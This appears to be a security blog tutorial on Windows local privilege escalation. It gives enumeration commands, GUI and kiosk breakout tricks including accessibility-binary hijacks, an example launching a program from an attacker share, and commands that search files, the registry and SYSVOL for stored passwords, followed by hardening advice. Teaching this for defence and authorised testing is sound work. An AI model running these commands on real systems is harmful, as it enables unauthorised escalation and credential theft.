Windows Local Privilege Escalation

2026-10-15 · 10 min read

You have a shell as a low-privileged user — a service account, a web-app identity, or a standard domain user on a workstation. Local privilege escalation turns that into SYSTEM or local administrator, from where you can dump credentials, install persistence, and move on. Almost every Windows route reduces to one idea: a privileged component trusts something a low-privileged user can control. This complements Windows Token Abuse & Potato Attacks and Windows Access Tokens & UAC.

Always enumerate first

Privilege escalation is an enumeration problem. The single most important line is whoami /priv — a dangerous privilege there is frequently a direct path to SYSTEM:

whoami /priv           # SeImpersonate / SeBackup / SeDebug = likely win
whoami /all            # groups and integrity level
systeminfo             # OS build + hotfixes (for CVE matching)
# automated:
winPEAS.exe quiet cmd fast
.\PrivescCheck.ps1 -Extended        # or Seatbelt.exe -group=all

Finding each one

# services whose binary or config a non-admin can modify (needs accesschk/winPEAS)
accesschk.exe -uwcqv "Everyone" *           # writable services
# unquoted service paths
wmic service get name,pathname,startname | findstr /i /v """ | findstr /i /v "C:\Windows"
# scheduled tasks running as SYSTEM
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User SYSTEM"
# AlwaysInstallElevated (both keys must be 1)
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

The recurring theme: writable + privileged

Every route is some privileged execution path — a service, a task, a DLL load, an installer policy — whose inputs a lower-privileged user can write. The work is enumeration to find the overlap; the fix is to remove it. That is why privesc hygiene is mostly about permissions and least privilege, not patching.

GUI & interactive escalation

Not every escalation is a command line. In an interactive session — console, RDP, a kiosk, or a Citrix/RDS published app — a graphical surface that already runs at a higher integrity can be walked into a shell. The mechanism is always the same: a child process inherits its parent's token, so if you can make a High- or SYSTEM-integrity GUI launch anything, that thing runs at the parent's level.

SurfaceHow you reach a shellResult
Auto-elevating GUI (UAC bypass)msconfig Tools → Launch, an MMC snap-in's Help Topics / Export-List / file dialog (azman.msc), or a “highest privileges” scheduled taskMedium admin → High integrity, no prompt (see UAC Bypass)
A GUI process already running as SYSTEM/adminVendor updaters, installers, “repair” wizards and setup UIs sitting on the interactive desktop — use their Open / Save As / Browse / Print / Help dialog to spawn a shellChild inherits SYSTEM/admin
Accessibility at the logon/lock screensethc.exe (Shift ×5) or utilman.exe (Win+U) replaced or IFEO-hijacked to cmd.exeSYSTEM shell before any login (see Persistence)
Kiosk / Citrix / RDS published appBreak out of the one allowed app through common dialogs, hyperlinks, embedded browsers, or a Save-As address bar to reach Explorer/cmd on the hostA full shell as the session, then escalate as normal

The file dialog is the workhorse. Almost every Windows GUI exposes a common Open/Save dialog, and its filename and address boxes accept a program name or path. Typing cmd.exe (or \\attacker\share\x.exe, or a file:// URL) and pressing Enter launches it as a child of the dialog's owner — set “Files of type” to All Files and you can also right-click an .exe → Open. This is exactly the UAC-bypass GUI trick; the only difference for full privesc is that the parent already holds a SYSTEM or admin token rather than a filtered one, so the shell you get is SYSTEM, not merely High.

Kiosk and published-application breakout is the classic “GUI privesc” on locked-down terminals and Citrix/RDS farms: Print → “Find a printer” or “Print to file”, Help → “Jump to URL” into a browser, an embedded file picker, or a right-click “Open file location” each reach a shell the kiosk policy never meant to expose.

Defence is the same token logic in reverse: keep interactive-desktop software from running as SYSTEM (split it into a service plus a least-privilege UI), set UAC to Always Notify, lock kiosk/published apps down with their own allow-lists (no file dialogs, no Help, no child processes), and protect the accessibility binaries — see Persistence for detection.

Credentials left lying around

Separately from misconfigurations, Windows hosts accumulate secrets that skip escalation entirely by handing you a higher-privileged account:

findstr /si password *.xml *.ini *.config *.txt 2>nul
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # autologon
cmdkey /list                                   # saved credentials
# Group Policy Preferences cpassword (reversible), unattend.xml, etc.
findstr /S /I cpassword \\<domain>\sysvol\*.xml

This overlaps with Windows Credential Storage.

Detection & hardening

  • Fix the ACLs — service binaries/config, task files and their directories should not be writable by standard users.
  • Quote service paths; remove writable PATH entries; disable AlwaysInstallElevated; never ship GPP passwords.
  • Least privilege for service accounts; prefer managed/virtual accounts and don't grant SeImpersonatePrivilege broadly.
  • Detect new/modified services and tasks, service-binary replacement, and MSI installs by non-admins (see Logging & Telemetry).
